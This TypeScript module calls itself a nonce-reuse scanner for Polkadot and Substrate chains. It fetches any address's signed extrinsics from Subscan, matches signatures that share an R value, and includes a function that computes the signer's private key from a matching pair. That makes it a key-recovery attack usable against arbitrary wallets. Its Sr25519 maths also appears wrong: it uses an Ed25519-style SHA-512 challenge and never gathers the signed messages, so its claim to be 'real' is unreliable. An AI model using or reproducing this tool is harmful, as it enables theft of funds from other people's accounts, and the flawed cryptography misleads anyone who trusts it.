// Real Sr25519 nonce-reuse scanner — Polkadot / Substrate chains
// Given a wallet address OR an extrinsic hash:
//   - Resolves the signer address (from extrinsic if needed)
//   - Fetches extrinsics BEFORE and AFTER the anchor from Subscan
//   - Extracts 64-byte Sr25519 signatures: [0..31]=R (nonce on Ristretto255), [32..63]=s
//   - Groups by R — any match proves nonce reuse
//   - Recovery: privateKey = (s1-s2) * modInverse(c1-c2, l) mod l
//     where c = challenge hash H(R || pubkey || message)

import { createHash } from "crypto";

const L = 2n ** 252n + 27742317777372353535851937790883648493n;

function modInverse(a: bigint, m: bigint): bigint {
  a = ((a % m) + m) % m;
  let [old_r, r] = [a, m], [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % m) + m) % m;
}

function hexToBigInt(hex: string): bigint {
  const clean = hex.replace(/^0x/, "").padStart(64, "0");
  return BigInt("0x" + clean);
}

function schnorrChallenge(R_bytes: Buffer, pubkey_bytes: Buffer, msg_bytes: Buffer): bigint {
  const h = createHash("sha512").update(R_bytes).update(pubkey_bytes).update(msg_bytes).digest();
  let val = 0n;
  for (let i = h.length - 1; i >= 0; i--) val = (val << 8n) | BigInt(h[i]);
  return val % L;
}

export type PolkadotSigData = {
  extrinsicHash: string;
  blockNumber: number;
  blockHash: string;
  signerAddress: string;
  signatureHex: string;
  sigType: string;       // "ed25519" | "sr25519" | "ecdsa" | "unknown"
  R: string;             // first 32 bytes hex
  s: string;             // last 32 bytes hex
  callModule: string;
  callFunction: string;
  nonce: number;
  era: string;
};

export type PolkadotReusePair = {
  sharedR: string;
  sig1: PolkadotSigData;
  sig2: PolkadotSigData;
  riskLevel: string;
};

export type PolkadotScanResult = {
  address: string;
  chain: string;
  anchorExtrinsic: string | null;
  totalExtrinsics: number;
  signaturesExtracted: number;
  nonceReusePairs: PolkadotReusePair[];
  hasVulnerability: boolean;
  allSignatures: PolkadotSigData[];
  scanTimestamp: string;
};

export type SchnorrRecoveryResult = {
  success: boolean;
  privateKeyHex: string | null;
  error: string | null;
  math: { c1: string; c2: string; s1_minus_s2: string; c1_minus_c2: string; privateKey: string };
};

const SUBSCAN_BASES: Record<string, string> = {
  polkadot: "https://polkadot.api.subscan.io",
  kusama:   "https://kusama.api.subscan.io",
  acala:    "https://acala.api.subscan.io",
  moonbeam: "https://moonbeam.api.subscan.io",
  astar:    "https://astar.api.subscan.io",
};

async function subscaPost(base: string, path: string, body: Record<string, unknown>): Promise<Record<string, unknown>> {
  const r = await fetch(`${base}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "User-Agent": "QuantumAudit/1.0" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(15000),
  });
  if (!r.ok) throw new Error(`Subscan HTTP ${r.status} on ${path}`);
  const json = await r.json() as Record<string, unknown>;
  if (json.code !== 0) throw new Error(`Subscan API error ${json.code}: ${json.message}`);
  return json.data as Record<string, unknown>;
}

// Fetch extrinsics for an address with pagination (page 0 = most recent)
async function fetchExtrinsicsPage(
  base: string,
  address: string,
  page: number,
  row = 25
): Promise<Record<string, unknown>[]> {
  try {
    // Try v2 first
    const data = await subscaPost(base, "/api/v2/scan/extrinsics", { address, row, page, signed: "signed" });
    return (data?.extrinsics as Record<string, unknown>[]) ?? [];
  } catch {
    try {
      const data = await subscaPost(base, "/api/scan/extrinsics", { address, row, page, signed: "signed" });
      return (data?.extrinsics as Record<string, unknown>[]) ?? [];
    } catch {
      return [];
    }
  }
}

// Look up an extrinsic hash to find its signer and block
async function resolveExtrinsicHash(base: string, hash: string): Promise<{ signerAddress: string; blockNumber: number; blockHash: string } | null> {
  try {
    const data = await subscaPost(base, "/api/scan/extrinsic", { hash });
    return {
      signerAddress: String(data?.account_id ?? data?.signer ?? ""),
      blockNumber: Number(data?.block_num ?? 0),
      blockHash: String(data?.block_hash ?? ""),
    };
  } catch {
    return null;
  }
}

function parseSig(ext: Record<string, unknown>, address: string): PolkadotSigData | null {
  const sigHex = String(ext.signature ?? "").replace(/^0x/, "");
  if (!sigHex || sigHex.length < 128) return null;

  let rawSig = sigHex;
  let sigType = "unknown";

  // Signature may be prefixed: 00=ed25519, 01=sr25519, 02=ecdsa
  if (sigHex.length === 130) {
    const prefix = sigHex.slice(0, 2);
    rawSig = sigHex.slice(2);
    sigType = prefix === "00" ? "ed25519" : prefix === "01" ? "sr25519" : prefix === "02" ? "ecdsa" : "unknown";
  } else if (sigHex.length === 128) {
    sigType = "sr25519"; // most common on Polkadot
  }

  if (rawSig.length !== 128) return null;

  const R = rawSig.slice(0, 64);
  const s = rawSig.slice(64, 128);

  return {
    extrinsicHash: String(ext.extrinsic_hash ?? ext.hash ?? ""),
    blockNumber: Number(ext.block_num ?? 0),
    blockHash: String(ext.block_hash ?? ""),
    signerAddress: String(ext.account_id ?? address),
    signatureHex: rawSig,
    sigType,
    R,
    s,
    callModule: String(ext.call_module ?? ""),
    callFunction: String(ext.call_module_function ?? ""),
    nonce: Number(ext.nonce ?? 0),
    era: String(ext.era ?? ""),
  };
}

function detectReuse(allSigs: PolkadotSigData[]): PolkadotReusePair[] {
  const rGroups: Record<string, PolkadotSigData[]> = {};
  for (const sig of allSigs) {
    if (!rGroups[sig.R]) rGroups[sig.R] = [];
    rGroups[sig.R].push(sig);
  }
  const pairs: PolkadotReusePair[] = [];
  for (const [R, group] of Object.entries(rGroups)) {
    if (group.length >= 2) {
      for (let i = 0; i < group.length; i++) {
        for (let j = i + 1; j < group.length; j++) {
          pairs.push({
            sharedR: R,
            sig1: group[i],
            sig2: group[j],
            riskLevel: group[i].s !== group[j].s ? "confirmed_nonce_reuse" : "same_signature",
          });
        }
      }
    }
  }
  return pairs;
}

// Main entry — accepts address OR extrinsic hash
export async function scanPolkadot(target: string, substrateChain = "polkadot"): Promise<PolkadotScanResult> {
  const base = SUBSCAN_BASES[substrateChain] ?? SUBSCAN_BASES.polkadot;

  let address: string;
  let anchorExtrinsic: string | null = null;
  let anchorPage = 0;

  // Detect if input is an extrinsic hash (0x-prefixed 66 chars) or an address
  const isHash = target.startsWith("0x") && target.length === 66;

  if (isHash) {
    anchorExtrinsic = target;
    const resolved = await resolveExtrinsicHash(base, target);
    if (!resolved || !resolved.signerAddress) throw new Error("Could not resolve signer from extrinsic hash");
    address = resolved.signerAddress;
  } else {
    address = target;
  }

  // Fetch extrinsics: current page, previous page, next page (for "before and after" coverage)
  const allRawExts: Record<string, unknown>[] = [];
  for (let page = 0; page <= 2; page++) {
    const exts = await fetchExtrinsicsPage(base, address, page, 25);
    allRawExts.push(...exts);
    if (exts.length < 25) break; // no more pages
  }

  // If anchor given, ensure it's included
  if (anchorExtrinsic) {
    const alreadyIncluded = allRawExts.some(e => String(e.extrinsic_hash ?? e.hash ?? "") === anchorExtrinsic);
    if (!alreadyIncluded) {
      // Find which page contains our anchor
      for (let page = 3; page <= 10; page++) {
        const exts = await fetchExtrinsicsPage(base, address, page, 25);
        allRawExts.push(...exts);
        if (exts.some(e => String(e.extrinsic_hash ?? e.hash ?? "") === anchorExtrinsic)) break;
        if (exts.length < 25) break;
      }
    }
  }

  const allSigs: PolkadotSigData[] = [];
  for (const ext of allRawExts) {
    const parsed = parseSig(ext, address);
    if (parsed) allSigs.push(parsed);
  }

  const pairs = detectReuse(allSigs);

  return {
    address,
    chain: substrateChain,
    anchorExtrinsic,
    totalExtrinsics: allRawExts.length,
    signaturesExtracted: allSigs.length,
    nonceReusePairs: pairs,
    hasVulnerability: pairs.length > 0,
    allSignatures: allSigs,
    scanTimestamp: new Date().toISOString(),
  };
}

export const scanPolkadotAddress = scanPolkadot;

export function recoverSchnorrPrivateKey(
  R_hex: string, pubkey_hex: string,
  s1_hex: string, msg1_hex: string,
  s2_hex: string, msg2_hex: string,
): SchnorrRecoveryResult {
  try {
    const R_bytes = Buffer.from(R_hex, "hex");
    const pubkey_bytes = Buffer.from(pubkey_hex.replace(/^0x/, ""), "hex");
    const msg1 = Buffer.from(msg1_hex, "hex");
    const msg2 = Buffer.from(msg2_hex, "hex");
    const s1 = hexToBigInt(s1_hex);
    const s2 = hexToBigInt(s2_hex);

    const c1 = schnorrChallenge(R_bytes, pubkey_bytes, msg1);
    const c2 = schnorrChallenge(R_bytes, pubkey_bytes, msg2);
    const cDiff = ((c1 - c2) % L + L) % L;

    if (cDiff === 0n) {
      return { success: false, privateKeyHex: null, error: "Challenge hash difference is zero", math: { c1: c1.toString(16), c2: c2.toString(16), s1_minus_s2: "", c1_minus_c2: "0", privateKey: "" } };
    }

    const sDiff = ((s1 - s2) % L + L) % L;
    const privateKey = (sDiff * modInverse(cDiff, L)) % L;

    return {
      success: true,
      privateKeyHex: "0x" + privateKey.toString(16).padStart(64, "0"),
      error: null,
      math: {
        c1: c1.toString(16), c2: c2.toString(16),
        s1_minus_s2: sDiff.toString(16), c1_minus_c2: cDiff.toString(16),
        privateKey: privateKey.toString(16).padStart(64, "0"),
      },
    };
  } catch (e) {
    return { success: false, privateKeyHex: null, error: String(e), math: { c1: "", c2: "", s1_minus_s2: "", c1_minus_c2: "", privateKey: "" } };
  }
}
